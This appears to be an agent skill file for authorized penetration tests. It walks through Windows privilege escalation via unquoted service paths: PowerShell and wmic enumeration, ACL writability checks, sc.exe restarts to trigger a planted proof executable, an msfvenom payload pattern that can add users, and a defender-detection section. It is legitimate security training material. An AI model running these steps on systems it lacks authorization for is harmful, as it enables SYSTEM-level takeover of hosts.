---
name: unquoted-service-paths
description: Use when you have a low-privilege Windows shell on an
  authorized engagement and need to check services for unquoted path
  privilege escalation. Covers enumerating service binary paths, spotting
  unquoted paths with spaces, testing directory writability, and planting
  a proof executable. Use when starting Windows privilege escalation, when
  WinPEAS flags services, or when you need a reliable SYSTEM path.
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
parent: privesc-windows
requires: [privesc-windows]
extends: []
relates: [privesc-linux]
tools:
  - name: PowerShell
    version: 7.4
  - name: Python
    version: 3.12
---

Windows resolves an unquoted service path with spaces by trying each
prefix: `C:\Program Files\My App\service.exe` tries `C:\Program.exe`,
then `C:\Program Files\My.exe`, before the real binary. A writable
directory early in that chain plus a service restart equals SYSTEM. This
skill covers the full check on authorized engagements: enumeration,
writability testing, payload planting, and safe triggering.

## Quick Workflow

1. Enumerate all services with their binary paths and start types.
2. Flag paths that contain spaces and lack quotes.
3. For each, test writability of every directory in the resolution chain.
4. Check who can restart the service (or wait for a reboot).
5. Plant a proof executable at the winning path with approval.
6. Trigger the service and confirm SYSTEM execution.
7. Remove the payload and restore the original state.

## 1. Enumeration

```powershell
# List services with binary paths (PowerShell)
Get-CimInstance Win32_Service | Select-Object Name, PathName, StartMode, State |
  Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' }

# Classic wmic equivalent on older hosts
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"

# Focus: third-party services in Program Files are the usual winners;
# Windows built-ins are almost always quoted
```

The filter matters: quoted paths and paths without spaces cannot be
abused this way. What remains is usually a short list, often one or two
services.

## 2. Writability and restart rights

```powershell
# Test each directory in the chain, e.g. C:\Program Files\My App\service.exe
# Chain: C:\, C:\Program Files\, C:\Program Files\My App\
$dirs = @('C:\', 'C:\Program Files\', 'C:\Program Files\My App\')
foreach ($d in $dirs) {
  $acl = Get-Acl $d
  $acl.Access | Where-Object { $_.IdentityReference -like '*Users*' -and
    $_.FileSystemRights -like '*Write*' } | Select-Object IdentityReference, FileSystemRights
}

# Can you restart the service? Check service permissions
sc.exe qc "VulnerableService"
# Look for SERVICE_START / SERVICE_STOP for your user, or check with accesschk
```

You need two things: a writable directory in the chain AND a way to
(start, restart) the service. Writable without restart means waiting for a
reboot; restart without writability means nothing. Confirm both before
planting anything.

## 3. Payload and trigger

```powershell
# Generate a proof payload on your attack box (msfvenom pattern),
# then copy it to the winning path, e.g. C:\Program.exe
# Proof payload: adds a user or writes a marker file as SYSTEM

# Plant with approval, then trigger
sc.exe stop "VulnerableService"
sc.exe start "VulnerableService"

# Confirm: check for the marker or the new process running as SYSTEM
tasklist /v | findstr /i "payload"
```

Use a benign proof first (write `C:\proof.txt` as SYSTEM) before any
payload that adds users or opens shells. The finding is proven at the
marker file; escalate the payload only as the engagement needs.

## Edge cases

- The path has spaces but IS quoted. Not vulnerable; move on without
  testing further.
- The directory is writable but the service cannot be restarted by you.
  Note it as a reboot-dependent path, or check for other triggers
  (service crashes, scheduled restarts).
- The service runs as a service account, not SYSTEM. Still valuable:
  escalate to that account first, then continue privesc from there.
- Modern Windows quotes more paths by default. The yield is lower than
  it was in 2010, but third-party installers still get it wrong.

## Escalation

- No unquoted paths: move to alwaysinstallelevated, dll-hijacking, and
  token-impersonation in the privesc-windows order.
- The payload planted but the service failed to start: check the binary
  name the service actually tried (ProcMon on a lab replica helps), and
  clean up the failed payload.
- Cleanup is mandatory: remove the planted executable and verify the
  service still starts correctly afterward.

## Detection and defender view

Defenders see this as a new executable appearing in Program Files,
a service starting an unexpected binary, and SYSTEM processes with odd
parents. Sysmon and EDR catch the process-creation anomaly; FIM catches
the new file. Defenses are quoting all service paths (installer
hygiene), locking down Program Files ACLs, monitoring service binary
changes, and alerting on services spawning unusual children.

## Key references

- MITRE ATT&CK T1574.009 (Hijack Execution Flow: Path Interception by
  Unquoted Path).
- CWE-428 (Unquoted Search Path or Element).
- Microsoft guidance on secure service installation.
